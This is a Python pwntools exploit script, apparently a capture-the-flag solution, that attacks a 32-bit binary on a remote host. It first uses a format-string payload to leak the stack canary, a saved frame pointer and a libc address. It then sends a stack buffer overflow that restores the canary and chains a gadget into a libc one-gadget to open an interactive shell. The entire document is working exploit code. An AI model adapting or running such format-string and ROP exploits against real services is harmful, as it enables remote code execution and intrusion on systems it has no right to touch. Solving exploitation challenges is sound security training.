#!/usr/bin/env python3

from pwn import *

exe = ELF("./f_two_patched")
libc = ELF("./libc6_2.27-3ubuntu1.2_i386.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'debug'

# p = process('./f_two_patched')
p = connect('142.93.228.122', 2222)

#############################
### Stage 1: Leak address ###
#############################
stack_canary_offset = 50
ebp_offset = 62
_IO_2_1_stdin_offset = libc.symbols['_IO_2_1_stdin_']
one_gadget_offset = 0x1380bf

payload1 = b"M"
payload1 += b"A"*13
payload1 += b"%27$p%28$p%30$p"

p.recvuntil(b'day :')
p.sendline(b'10')
p.recvuntil(b'month:')
p.sendline('{}'.format(0x10000c).encode())
p.recvuntil(b'year:')
p.sendline(b'2000')
p.recvuntil(b'gender (M/F) :')
p.sendline(payload1)
data = p.recvline()[:-1].split(b'0x')

stack_canary_value = int(data[1].decode(), 16)
_IO_2_1_stdin_addr = int(data[2].decode(), 16)
ebp_value = int(data[3].decode(), 16)
libc_base = _IO_2_1_stdin_addr - _IO_2_1_stdin_offset
one_gadget_addr = libc_base + one_gadget_offset
print('[+] Leak stack canary value:       ', hex(stack_canary_value))
print('[+] Leak ebp value:                ', hex(ebp_value))
print('[+] Leak _IO_2_1_stdin_ address:   ', hex(_IO_2_1_stdin_addr))
print('[*] Libc base address:             ', hex(libc_base))
print('[*] One gadget address:            ', hex(one_gadget_addr))

################################
### Stage 2: Buffer overflow ###
################################
GOT_address_of_libc_offset = 0x1d8000       # PLTGOT (readelf -d) (rw section of libc (vmmap gdb))
pop_ebx_ret = 0x08048459
GOT_address_of_libc_addr = libc_base + GOT_address_of_libc_offset

payload2 = b"A"*50
payload2 += p32(stack_canary_value)
payload2 = payload2.ljust(ebp_offset, b'B')
payload2 += p32(ebp_value)
payload2 += p32(pop_ebx_ret)
payload2 += p32(GOT_address_of_libc_addr)
payload2 += p32(one_gadget_addr)
payload2 += b'\x00'*4

p.recvuntil(b'Academia :')
p.sendline(payload2)

p.interactive()
